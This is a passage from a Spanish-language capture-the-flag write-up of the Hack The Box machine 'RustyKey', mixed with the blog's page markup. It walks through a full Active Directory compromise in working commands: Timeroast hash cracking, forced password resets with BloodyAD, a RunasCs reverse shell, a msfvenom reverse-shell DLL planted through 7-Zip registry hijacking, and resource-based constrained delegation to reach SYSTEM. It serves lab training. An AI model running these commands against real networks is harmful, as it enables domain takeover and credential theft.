1105:$sntp-ms$320bc421c1c9d94a2cd9167690407e21$1c0111e900000000000a0dbf4c4f434cec0ed0a3e37c9d09e1b8428bffbfcd0aec0ee2c4377448a7ec0ee2c437748004 1106:$sntp-ms$691323cb889f1d4942ba852b76dddd41$1c0111e900000000000a0dbf4c4f434cec0ed0a3e11f7aefe1b8428bffbfcd0aec0ee2c438ee2a14ec0ee2c438ee6828 1107:$sntp-ms$3df435634efabe597c6ba45b467b32a9$1c0111e900000000000a0dbf4c4f434cec0ed0a3e2b5db18e1b8428bffbfcd0aec0ee2c43a8490f3ec0ee2c43a84c9fe 1118:$sntp-ms$ed34432091c0f7c00083789da362b8fa$1c0111e900000000000a0dbf4c4f434cec0ed0a3e2d472b3e1b8428bffbfcd0aec0ee2c446ab565aec0ee2c446ab97c8 1119:$sntp-ms$5a5d5270a9da3449524a6085f688540e$1c0111e900000000000a0dbf4c4f434cec0ed0a3e462cd54e1b8428bffbfcd0aec0ee2c44839abf3ec0ee2c44839f0bc 1120:$sntp-ms$ddc14498b787aea173941e2769d23d3e$1c0111e900000000000a0dbf4c4f434cec0ed0a3e1b381a2e1b8428bffbfcd0aec0ee2c449a2fdc6ec0ee2c449a331c8 1121:$sntp-ms$b3883b18358ee4c84cff74c9dc866a93$1c0111e900000000000a0dbf4c4f434cec0ed0a3e33c6bc1e1b8428bffbfcd0aec0ee2c44b2bdf81ec0ee2c44b2c1f42 1122:$sntp-ms$0779b1e1f5ea64304171b7629bb85d66$1c0111e900000000000a0dbf4c4f434cec0ed0a3e0e43096e1b8428bffbfcd0aec0ee2c44caab6f8ec0ee2c44caaeafa 1123:$sntp-ms$99be370df44d079b625f8b9bd2cf7e77$1c0111e900000000000a0dbf4c4f434cec0ed0a3e2687a3ce1b8428bffbfcd0aec0ee2c44e2efd43ec0ee2c44e2f37fb 1124:$sntp-ms$c9c9afd2b5e0a213f86405a8bec502e1$1c0111e900000000000a0dbf4c4f434cec0ed0a3e3cf38b7e1b8428bffbfcd0aec0ee2c44f95bbbeec0ee2c44f95fd2c 1125:$sntp-ms$3524750c3f3d67dc77afd70a9aaa089d$1c0111e900000000000a0dbf4c4f434cec0ed0a3e128fefce1b8428bffbfcd0aec0ee2c45107fc4dec0ee2c45108538b 1126:$sntp-ms$451ef9681d71a9fc31e9260b5375b049$1c0111e900000000000a0dbf4c4f434cec0ed0a3e132a13ce1b8428bffbfcd0aec0ee2c45111bcc0ec0ee2c45111ebba 1127:$sntp-ms$c265a4c43762196620b4938f2ce99800$1c0111e900000000000a0dbf4c4f434cec0ed0a3e29c1d01e1b8428bffbfcd0aec0ee2c4527b2e74ec0ee2c4527b6fe2 Y luego lo craqueamos con hashcat. En mi caso con mi hashcat instalado en mi máquina estaba teniendo un error ya que no existía el modulo 31300. Así que me tuve que descargar el binario de la versión beta de hashcat que si que tenía este modulo.\n❯ ./hashcat.bin -m 31300 ~/Workspace/HTB/RustyKey/CONTENT/solo_ntp-hashes.txt /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt hashcat (v6.2.6-1063-g696fa3b2a) starting ...SNIP Watchdog: Temperature abort trigger set to 90c Host memory required for this attack: 617 MB Dictionary cache built: * Filename..: /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt * Passwords.: 14344391 * Bytes.....: 139921497 * Keyspace..: 14344384 * Runtime...: 1 sec $sntp-ms$3524750c3f3d67dc77afd70a9aaa089d$1c0111e900000000000a0dbf4c4f434cec0ed0a3e128fefce1b8428bffbfcd0aec0ee2c45107fc4dec0ee2c45108538b:Rusty88! Approaching final keyspace - workload adjusted. Session..........: hashcat Status...........: Exhausted Hash.Mode........: 31300 (MS SNTP) Hash.Target......: /home/borhub/Workspace/HTB/RustyKey/CONTENT/solo_ntp-hashes.txt Time.Started.....: Wed Jul 2 00:54:07 2025 (3 secs) Time.Estimated...: Wed Jul 2 00:54:10 2025 (0 secs) Kernel.Feature...: Pure Kernel Guess.Base.......: File (/usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#01........: 65126.0 kH/s (3.63ms) @ Accel:1024 Loops:1 Thr:64 Vec:1 Recovered........: 1/16 (6.25%) Digests (total), 1/16 (6.25%) Digests (new), 1/16 (6.25%) Salts Progress.........: 229510144/229510144 (100.00%) Rejected.........: 0/229510144 (0.00%) Restore.Point....: 14344384/14344384 (100.00%) Restore.Sub.#01..: Salt:15 Amplifier:0-1 Iteration:0-1 Candidate.Engine.: Device Generator Candidates.#01...: 0213Dom -\u003e $HEX[042a0337c2a156616d6f732103] Hardware.Mon.#01.: Temp: 56c Util: 3% Core: 533MHz Mem:2400MHz Bus:16 Started: Wed Jul 2 00:53:59 2025 Stopped: Wed Jul 2 00:54:12 2025 Si nos fijamos la contraseña que hemos craqueado viene del RID 1125, y si miramos los SID de los equipos del sistema que tenemos enumerados podemos saber que esta contraseña pertenece al equipo ITCOMPUTER3.RUSTYKEY.HTB.\nY ahora comprobamos las credenciales con nxc ldap.\n❯ nxc ldap 10.10.11.75 -u 'IT-COMPUTER3' -p 'Rusty88!' -k LDAP 10.10.11.75 389 DC [*] None (name:DC) (domain:rustykey.htb) LDAP 10.10.11.75 389 DC [+] rustykey.htb\\IT-COMPUTER3:Rusty88! Ahora vamos a solicitar el Ticket Garanting Ticket (TGT) para usar el archivo .ccache para autenticar-nos más adelante.\n❯ getTGT.py rustykey.htb/IT-COMPUTER3:'Rusty88!' -dc-ip 10.10.11.75 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Saving ticket in IT-COMPUTER3.ccache ❯ export KRB5CCNAME=/home/borhub/Workspace/HTB/RustyKey/CONTENT/IT-COMPUTER3.ccache ❯ klist Ticket cache: FILE:/home/borhub/Workspace/HTB/RustyKey/CONTENT/IT-COMPUTER3.ccache Default principal: IT-COMPUTER3@RUSTYKEY.HTB Valid starting Expires Service principal 02/07/25 05:15:47 02/07/25 15:15:47 krbtgt/RUSTYKEY.HTB@RUSTYKEY.HTB renew until 03/07/25 05:15:47 Bloodhound Enumeration Haciendo uso de bloodhound-python y con Bloodhound-CE vamos a recolectar toda la información del dominio.\n❯ bloodhound-python -u 'rr.parker' -k -no-pass -d RUSTYKEY.HTB -ns 10.10.11.75 -dc \"$FQDN\" -c all --zip --auth-method kerberos INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3) INFO: Found AD domain: rustykey.htb INFO: Using TGT from cache INFO: Found TGT with correct principal in ccache file. INFO: Connecting to LDAP server: DC.rustykey.htb INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 16 computers INFO: Connecting to LDAP server: DC.rustykey.htb INFO: Found 12 users INFO: Found 58 groups INFO: Found 2 gpos INFO: Found 10 ous INFO: Found 19 containers INFO: Found 0 trusts INFO: Starting computer enumeration with 10 workers INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: dc.rustykey.htb INFO: Done in 00M 21S INFO: Compressing output into 20250701191109_bloodhound.zip Abusando de permisos AddSelf para añadir un equipo al grupo HELPDESK- BloodyAD Si ahora miramos los permisos que contiene el equipo IT-COMPUTER3, vemos que tiene permisos AddSelf sobre el grupo HelpDesk .\nCon lo cual lanzamos con BloodyAD el comando usando la opción -k para autenticarse a través de kerberos.\nAl escribir el nombre del equipo IT-COMPUTER, le añadimos el carácter “$” para interprete este usuario como un equipo del dominio, sino, nos interpertara IT-COMPUTER3 como un usuario y nos dará error.\nAhora si miramos los permisos del grupo HelpDesk, vemos que tiene permisos ForceChangePassword en todos los usuarios, GenericWrite sobre DD.ALI y permisos AddMember sobre el grupo Protected Objects.\nAbusando de permisos ForceChangePassword - BloodyAD Volviendo a hacer uso de BloodyAD, cambiamos la contraseña del usuario bb.morgan.\n❯ bloodyAD --host DC.rustykey.htb -d rustykey.htb -k -u 'IT-COMPUTER3$' -p 'Rusty88!' set password 'bb.morgan' 'Password88!' [+] Password changed successfully! Ahora una vez cambio la contraseña del usuario nos encontramos el siguiente error al ejecutar la comprobación de credenciales.\n❯ nxc ldap 10.10.11.75 -u 'bb.morgan' -p 'Password88!' -k LDAP 10.10.11.75 389 DC [*] None (name:DC) (domain:rustykey.htb) LDAP 10.10.11.75 389 DC [-] rustykey.htb\\bb.morgan:Password88! KDC_ERR_ETYPE_NOSUPP Esto sucede porque estamos usando un Usuario Protegido, ya que las restricciones de seguridad bloquean este algoritmo.\nQuitando grupo Protected Objects del grupo IT - BloodyAD ❯ bloodyAD --host DC.rustykey.htb -d rustykey.htb -k -u 'IT-COMPUTER3$' -p 'Rusty88!' set password 'bb.morgan' 'Password88!' [+] Password changed successfully! ❯ bloodyAD --host DC.rustykey.htb -d rustykey.htb -k -u 'IT-COMPUTER3$' -p 'Rusty88!' remove groupMember \"PROTECTED OBJECTS\" IT [-] IT removed from PROTECTED OBJECTS ❯ nxc ldap DC.rustykey.htb -u 'bb.morgan' -p 'Password88!' -k LDAP DC.rustykey.htb 389 DC [*] None (name:DC) (domain:rustykey.htb) LDAP DC.rustykey.htb 389 DC [+] rustykey.htb\\bb.morgan:Password88! Ahora nos generamos un TGT para poder entrar a través de winrm\n❯ getTGT.py rustykey.htb/bb.morgan:'Password88!' -dc-ip 10.10.11.75 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Saving ticket in bb.morgan.ccache ❯ export KRB5CCNAME=/home/borhub/Workspace/HTB/RustyKey/CONTENT/bb.morgan.ccache ❯ evil-winrm -i DC.rustykey.htb -r rustykey.htb Evil-WinRM shell v3.7 Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\bb.morgan\\Documents\u003e type ../Desktop/user.txt 70255a6359bebcea23de7e9988732180 Pivoting a usuario MM.TURNER Mirando los archivos que el usuario bb.morgan tiene en sus carpetas vemos que en Desktop tiene un archivo llamado internal.pdf. Con lo cual nos lo descargamos a local para así poder trabajar con el.\nSMB File Upload Nos abrimos un servidor SMB en nuestra máquina atacante con smbserver y luego desde la máquina windows copiamos el archivo objetivo al servidor SMB.\n#Montar servidor SMB ❯ sudo smbserver.py smbFolder $(pwd) -smb2support [sudo] contraseña para borhub: Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed #Copiar archivo de máquina Windows al servidor SMB de mi máquina atacante *Evil-WinRM* PS C:\\Users\\bb.morgan\\Desktop\u003e copy C:\\Users\\bb.morgan\\Desktop\\internal.pdf \\\\10.10.15.254\\smbFolder\\internal.pdf #Recibimos el archivo en el servidor SMB [*] Incoming connection (10.10.11.75,52360) [*] AUTHENTICATE_MESSAGE (\\,DC) [*] User DC\\ authenticated successfully [*] :::00::aaaaaaaaaaaaaaaa [*] Connecting Share(1:IPC$) [*] Connecting Share(2:smbFolder) [*] Disconnecting Share(1:IPC$) [*] Disconnecting Share(2:smbFolder) [*] Closing down connection (10.10.11.75,52360) [*] Remaining connections [] En el pdf se indica que al grupo Support se le han añadido un acceso extendido temporal para hacer pruebas a través de los equipos compartidos. También indica que es para solucionar los problemas reportados con la extracción/compresión reportada por los grupos Finance y IT.\nSabiendo lo anterior, y visto que con el usuario bb.morgan no podemos hacer nada, intentamos crearnos un tgt y abrirnos una shell con evilwinrm usando al usuario ee.reed. Pero esto nos da un error de que las credenciales de ee.reed están expiradas.\nShell como ee.reed - RunasCs.exe RunasCS es una herramienta que nos permite ejecutar diferentes procesos con los permisos obtenidos de las credenciales que le indicamos en el la linea de comando. Para empezar, vamos a subir a la máquina mediante upload el archivo RunasCs.exe.\n*Evil-WinRM* PS C:\\Users\\bb.morgan\\Documents\u003e upload ./RunasCs/RunasCs.exe Info: Uploading /home/borhub/Workspace/HTB/RustyKey/CONTENT/RunasCs/RunasCs.exe to C:\\Users\\bb.morgan\\Documents\\RunasCs.exe Data: 68948 bytes of 68948 bytes copied Info: Upload successful! Ahora necesitamos cambiar la contraseña del usuario ee.reed y luego retirar el grupo SUPPORT de PROTECTED OBJECTS.\n❯ bloodyAD --host DC.rustykey.htb -d rustykey.htb -k -u 'IT-COMPUTER3$' -p 'Rusty88!' set password 'ee.reed' 'Password88!' [+] Password changed successfully! ❯ bloodyAD --host DC.rustykey.htb -d rustykey.htb -k -u 'IT-COMPUTER3$' -p 'Rusty88!' remove groupMember \"PROTECTED OBJECTS\" SUPPORT [-] SUPPORT removed from PROTECTED OBJECTS Ahora ya con el grupo removido, ejecutamos runascs.\n*Evil-WinRM* PS C:\\Users\\bb.morgan\\Documents\u003e .\\RunasCs.exe ee.reed Password88! powershell.exe -r 10.10.15.254:4444 [*] Warning: User profile directory for user ee.reed does not exists. Use --force-profile if you want to force the creation. [*] Warning: The logon for user 'ee.reed' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token. [+] Running in session 0 with process function CreateProcessWithLogonW() [+] Using Station\\Desktop: Service-0x0-c601a$\\Default [+] Async process 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe' with pid 2152 created in background. ❯ nc -lvnp 4444 Connection from 10.10.11.75:51076 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\Windows\\system32\u003e whoami whoami rustykey\\ee.reed Comprobar claves de registro - Reg query Una vez con la shell reed establecida, vamos a proceder a buscar claves de registro relacionadas con las utilidades de archivado que el documento .pdf menciona.\nUsando reg query consultamos el registro del sistema, esta vez le indicamos que que nos busque los manejadores de menús contextuales o ContextMenuHandlers que son los elementos que aparecen al hacer clic derecho en cualquier archivo.\nPS C:\\Windows\\system32\u003e reg query \"HKCR\\*\\shellex\\ContextMenuHandlers\" /s reg query \"HKCR\\*\\shellex\\ContextMenuHandlers\" /s HKEY_CLASSES_ROOT\\*\\shellex\\ContextMenuHandlers\\7-Zip (Default) REG_SZ {23170F69-40C1-278A-1000-000100020000} HKEY_CLASSES_ROOT\\*\\shellex\\ContextMenuHandlers\\ModernSharing (Default) REG_SZ {e2bf9676-5f8f-435c-97eb-11607a5bedf7} HKEY_CLASSES_ROOT\\*\\shellex\\ContextMenuHandlers\\Open With (Default) REG_SZ {09799AFB-AD67-11d1-ABCD-00C04FC30936} HKEY_CLASSES_ROOT\\*\\shellex\\ContextMenuHandlers\\Open With EncryptionMenu (Default) REG_SZ {A470F8CF-A1E8-4f65-8335-227475AA5C46} HKEY_CLASSES_ROOT\\*\\shellex\\ContextMenuHandlers\\Sharing (Default) REG_SZ {f81e9010-6ea4-11ce-a7ff-00aa003ca9f6} HKEY_CLASSES_ROOT\\*\\shellex\\ContextMenuHandlers\\{90AA3A4E-1CBA-4233-B8BB-535773D48449} (Default) REG_SZ Taskband Pin HKEY_CLASSES_ROOT\\*\\shellex\\ContextMenuHandlers\\{a2a9545d-a0c2-42b4-9708-a0b2badd77c8} (Default) REG_SZ Start Menu Pin PS C:\\Users\\Public\u003e reg query \"HKCR\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\\InprocServer32\" /ve reg query \"HKCR\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\\InprocServer32\" /ve HKEY_CLASSES_ROOT\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\\InprocServer32 (Default) REG_SZ C:\\Program Files\\7-Zip\\7-zip.dll Generar DLL maliciosa - msfvenom Una vez hecha todas las comprobaciones vamos a generar una dll maliciosa, para que en el momento de que sea ejecutada cargue una reverse shell a nuestro puerto en escucha.\n❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.254 LPORT=4444 -f dll -o malicious.dll [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 460 bytes Final size of dll file: 9216 bytes Saved as: malicious.dll Ahora nos pasamos con certutil el archivo malicioso a la máquina victima.\n❯ python3 -m http.server 8080 Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ... 10.10.11.75 - - [06/Jul/2025 08:14:49] \"GET /malicious.dll HTTP/1.1\" 200 - 10.10.11.75 - - [06/Jul/2025 08:14:49] \"GET /malicious.dll HTTP/1.1\" 200 - certutil -urlcache -split -f http:///malicious.dll C:\\Users\\Public\\malicious.dll Modificar claves de registro (DLL Hijacking) - Reg add Ahora hijackeamos el menú contextual de 7zip con reg add para ejecutar código arbitrario:\nPS C:\\Users\\Public\u003e reg add \"HKCR\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\\InprocServer32\" /ve /t REG_SZ /d \"C:\\Users\\Public\\malicious.dll\" /f reg add \"HKCR\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\\InprocServer32\" /ve /t REG_SZ /d \"C:\\Users\\Public\\malicious.dll\" /f The operation completed successfully. #Revisamos que se ha cambiado el dll por el nuestro malicioso PS C:\\Users\\Public\u003e reg query \"HKCR\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\\InprocServer32\" /ve reg query \"HKCR\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\\InprocServer32\" /ve HKEY_CLASSES_ROOT\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\\InprocServer32 (Default) REG_SZ C:\\Users\\Public\\malicious.dll Una vez cambiado el registro, nos abriremos un puerto con nc para esperar a obtener la shell del usuario victima para cuando vaya a usar el programa 7-zip.\n❯ nc -lvnp 4444 Connection from 10.10.11.75:53054 Microsoft Windows [Version 10.0.17763.7434] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\u003ewhoami whoami rustykey\\mm.turner Escalada de privilegios Una vez habiendo obtenido una shell como mm.turner, mirando el bloodhound vemos que el único Domain admin es administrator pero exite otra cuenta con permisos de administrador llamada backupadmin.\nAbusing AddAllowedToAct - Resource-Based Constrained Delegation Resource Based Constrained Delegation nos da permisos para establecer en el objeto quien puede suplantar (impersonate) cualquier usuario contra el (objeto).\nPara que este caso se de, el objecto restringido (constrained) tiene que tener el atributo msDS-AllowedToActOnBehalfOfOtherIdentity junto con el nombre del usuario que puede suplantar.\nPrimero como atacantes necesitamos comprometer una cuenta que tenga el SPN o crear una en el caso de que la MAQ (MachineAccountQuota) no sea igual a 0, ya que eso quiere decir que no tenemos la capacidad de crear ninguna cuenta para una máquina.\nUna vez con la cuenta creada o comprometida, necesitamos escribir en los privilegios de la máquina victima para configurar el Resource-based Constrained Delegation y así permitirnos suplantar cualquier usuario contra la máquina victima.\nAhora usando impacket realizamos un ataque completo S4U (S4U2Self y S4U2Proxy) desde la máquina comprometida a la máquina victima para obtener el usuario privilegiado con acceso a la máquina victima.\nResource Based Constrained Delegation - HackTricks\nResource Based Constrained Delegation - Swisskyrepo\nComprobamos que el MachineAccountQuota esta a 0 con lo cual no podemos creear ninguna máquina para llevar a cabo el ataque.\nPS C:\\Windows\u003e Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota DistinguishedName : DC=rustykey,DC=htb ms-DS-MachineAccountQuota : 0 Name : rustykey ObjectClass : domainDNS ObjectGUID : 039d5090-607d-4601-9145-7efcd0380eb1 Para darle una solución a este problema, anteriormente habíamos comprometido el equipo IT-COMPUTER3$ con lo cual le asignamos los permisos AllowedToDelegateToAccount usando PowerShell.\nSet-ADComputer dc -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$ Ahora haciendo uso de la herramienta getST.py de impacket vamos a realizar el ataque S4U para solicitar un service ticket (ST) suplantando al usuario backupadmin.\n❯ getST.py -spn 'cifs/DC.rustykey.htb' -impersonate backupadmin -dc-ip 10.10.11.75 -k 'rustykey.htb/IT-COMPUTER3$:Rusty88!' /home/borhub/Entornos-Pentesting/pentest-venv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools\u003c81. import pkg_resources Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Impersonating backupadmin [*] Requesting S4U2self [*] Requesting S4U2Proxy [*] Saving ticket in backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache ❯ klist Ticket cache: FILE:/home/borhub/Workspace/HTB/RustyKey/CONTENT/backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache Default principal: backupadmin@rustykey.htb Valid starting Expires Service principal 07/07/25 06:00:24 07/07/25 06:14:43 cifs/DC.rustykey.htb@RUSTYKEY.HTB renew until 07/07/25 20:14:43 ❯ export KRB5CCNAME=/home/borhub/Workspace/HTB/RustyKey/CONTENT/backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache Hemos solicitado un ticket de servicio para CIFS, es decir, para el sistema del ficheros del sistema. Con lo cual vamos a poder acceder al DC como NT SYSTEM usando al usuario administrador backupadmin.\n❯ psexec.py -k -no-pass 'rustykey.htb/backupadmin@dc.rustykey.htb' /home/borhub/Entornos-Pentesting/pentest-venv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools\u003c81. import pkg_resources Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Requesting shares on dc.rustykey.htb..... [*] Found writable share ADMIN$ [*] Uploading file wDEwvDhk.exe [*] Opening SVCManager on dc.rustykey.htb..... [*] Creating service cCrO on dc.rustykey.htb..... [*] Starting service cCrO..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.17763.7434] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Users\\Administrator\u003e type Desktop\\root.txt e9e309664d09ceb1cd827c28209aa25c ",
+  "wordCount" : "4590",
+  "inLanguage": "en",
+  "image":"https://borhuub.github.io/logo_machines/rustykey.png","datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Borhub"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://borhuub.github.io/writeups/rustykey/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Borhub Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://borhuub.github.io/%3Clink%20/%20abs%20url%3E"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://borhuub.github.io/" accesskey="h" title="Home (Alt + H)">
+                <img src="https://borhuub.github.io/apple-touch-icon.png" alt="" aria-label="logo"
+                    height="35">Home</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://borhuub.github.io/writeups/" title="Writeups">
+                    <span>Writeups</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://borhuub.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://borhuub.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://borhuub.github.io/writeups/">Writeups</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Rustykey
+    </h1>
+    <div class="post-description">
+      Writeup sobre la máquina Rustykey en Active Directory de dificultad Hard.Durante la fase de reconocimiento se identifica que la autenticación NTLM se encuentra deshabilitada, por lo que todo el ataque se apoya en Kerberos. Mediante enumeración SMB y usuarios con nxc, junto con BloodHound, se descubren relaciones y permisos mal configurados dentro del dominio. Los intentos iniciales de Kerberoasting y AS-REP Roasting no tienen éxito, recurriendo posteriormente a un Timeroasting Attack para avanzar. Aprovechando permisos AddSelf, se añade un equipo al grupo HELPDESK, y con ForceChangePassword se comprometen cuentas adicionales, eliminando además protecciones como Protected Objects del grupo IT. Esto permite pivotar a usuarios como MM.TURNER y posteriormente obtener una shell como ee.reed mediante subida de archivos por SMB y RunasCs.exe. Tras enumerar claves de registro, se explota un DLL Hijacking generando una DLL maliciosa con msfvenom y modificando el registro para lograr escalada de privilegios. Finalmente, abusando del permiso AddAllowedToAct, se explota Resource-Based Constrained Delegation, culminando en el compromiso completo del dominio.
+    </div>
+    <div class="post-meta"><span>22 min</span>&nbsp;·&nbsp;<span>4590 words</span>&nbsp;·&nbsp;<span>Borhub</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#reconocimiento" aria-label="Reconocimiento">Reconocimiento</a><ul>
+                        
+                <li>
+                    <a href="#autenticaci%c3%b3n-ntlm-deshabilitada" aria-label="Autenticación NTLM deshabilitada">Autenticación NTLM deshabilitada</a></li>
+                <li>
+                    <a href="#enumeraci%c3%b3n-smb--m%c3%b3dulo-spider_plus---nxc" aria-label="Enumeración SMB &#43; Módulo Spider_plus - nxc">Enumeración SMB + Módulo Spider_plus - nxc</a></li>
+                <li>
+                    <a href="#enumeraci%c3%b3n-usuarios---nxc" aria-label="Enumeración Usuarios - nxc">Enumeración Usuarios - nxc</a></li>
+                <li>
+                    <a href="#kerberoasting-attack-and-as-rep-roast-attack---getnpusers-failed" aria-label="Kerberoasting Attack and AS-REP Roast Attack - GetNPUsers (FAILED)">Kerberoasting Attack and AS-REP Roast Attack - GetNPUsers (FAILED)</a></li>
+                <li>
+                    <a href="#timeroasting-attack---timeroastpy" aria-label="Timeroasting Attack - Timeroast.py">Timeroasting Attack - Timeroast.py</a></li></ul>
+                </li>
+                <li>
+                    <a href="#bloodhound-enumeration" aria-label="Bloodhound Enumeration">Bloodhound Enumeration</a><ul>
+                        
+                <li>
+                    <a href="#abusando-de-permisos-addself-para-a%c3%b1adir-un-equipo-al-grupo-helpdesk--bloodyad" aria-label="Abusando de permisos AddSelf para añadir un equipo al grupo HELPDESK- BloodyAD">Abusando de permisos AddSelf para añadir un equipo al grupo HELPDESK- BloodyAD</a></li>
+                <li>
+                    <a href="#abusando-de-permisos-forcechangepassword---bloodyad" aria-label="Abusando de permisos ForceChangePassword - BloodyAD">Abusando de permisos ForceChangePassword - BloodyAD</a></li>
+                <li>
+                    <a href="#quitando-grupo-protected-objects-del-grupo-it---bloodyad" aria-label="Quitando grupo Protected Objects del grupo IT - BloodyAD">Quitando grupo Protected Objects del grupo IT - BloodyAD</a></li></ul>
+                </li>
+                <li>
+                    <a href="#pivoting-a-usuario-mmturner" aria-label="Pivoting a usuario MM.TURNER">Pivoting a usuario MM.TURNER</a><ul>
+                        
+                <li>
+                    <a href="#smb-file-upload" aria-label="SMB File Upload">SMB File Upload</a></li>
+                <li>
+                    <a href="#shell-como-eereed---runascsexe" aria-label="Shell como ee.reed - RunasCs.exe">Shell como ee.reed - RunasCs.exe</a></li>
+                <li>
+                    <a href="#comprobar-claves-de-registro---reg-query" aria-label="Comprobar claves de registro - Reg query">Comprobar claves de registro - Reg query</a></li>
+                <li>
+                    <a href="#generar-dll-maliciosa---msfvenom" aria-label="Generar DLL maliciosa - msfvenom">Generar DLL maliciosa - msfvenom</a></li>
+                <li>
+                    <a href="#modificar-claves-de-registro-dll-hijacking---reg-add" aria-label="Modificar claves de registro (DLL Hijacking) - Reg add">Modificar claves de registro (DLL Hijacking) - Reg add</a></li></ul>
+                </li>
+                <li>
+                    <a href="#escalada-de-privilegios" aria-label="Escalada de privilegios">Escalada de privilegios</a><ul>
+                        
+                <li>
+                    <a href="#abusing-addallowedtoact---resource-based-constrained-delegation" aria-label="Abusing AddAllowedToAct - Resource-Based Constrained Delegation">Abusing AddAllowedToAct - Resource-Based Constrained Delegation</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p>As is common in real life Windows pentests, you will start the RustyKey box with credentials for the following account: rr.parker / 8#t5HE8L!W3A</p>
